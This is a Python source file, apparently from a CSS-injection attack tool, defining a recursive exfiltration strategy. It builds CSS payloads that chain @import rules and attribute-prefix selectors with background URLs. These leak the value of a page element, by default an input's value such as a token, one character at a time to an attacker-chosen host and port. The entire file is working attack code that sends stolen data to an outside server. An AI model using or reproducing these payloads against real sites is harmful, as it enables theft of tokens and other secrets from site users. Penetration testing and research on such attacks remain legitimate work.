import urllib.parse

from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils import default


class RecursiveStrategy(BaseExfiltrationStrategy):
    """
    Recursive exfiltration strategy.
    Exfiltrates the DOM structure of the HTML using recursive imports.
    """

    name = "recursive"

    def __init__(self, hostname: str, port: int, element: str = "input", attribut: str = "value", timeout: float = 3.0) -> None:
        super().__init__(hostname, port, timeout)
        self.element = element
        self.attribut = attribut

    def generate_start_payload(self, client) -> str:
        return self._generate_import(client)

    def generate_next_payload(self, client) -> str:
        stri = self._generate_import(client)

        elements_attributs = []
        for client_element in client.elements:
            for element_attribut in client_element.attributs:
                if element_attribut.name == self.attribut:
                    elements_attributs.append(element_attribut)

        # Check if the token is complete
        stri += f"html:has({self.element}[{self.attribut}={repr(client.data)}]"
        stri += (
            f"{"".join([f":not({self.element}[{self.attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
        )
        stri += f"{"".join([":first-child" for i in range(client.counter)])}"
        stri += f'{{background:url("//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}");}}'

        # Payload to extract the token
        not_attributs = "".join(
            [f":not({self.element}[{self.attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs]
        )
        first_child = ":first-child" * client.counter
        stri += "".join(
            map(
                lambda x: f"html:has({self.element}[{self.attribut}^={repr(client.data+x)}]{not_attributs}{first_child}"
                f'{{background:url("//{self.hostname}:{self.port}/v?t={urllib.parse.quote_plus(client.data+x)}&cid={client.id}");}}',
                default.PRINTABLE,
            )
        )
        return stri

    def handle_valid(self, client, data: str) -> str:
        # Replace data (recursive gets the full accumulated value each time)
        client.data = data
        return "valid"

    def handle_end(self, client) -> None:
        return "end"

    def _generate_import(self, client) -> str:
        return f"@import url('//{self.hostname}:{self.port}/n?n={client.counter}&cid={client.id}');"
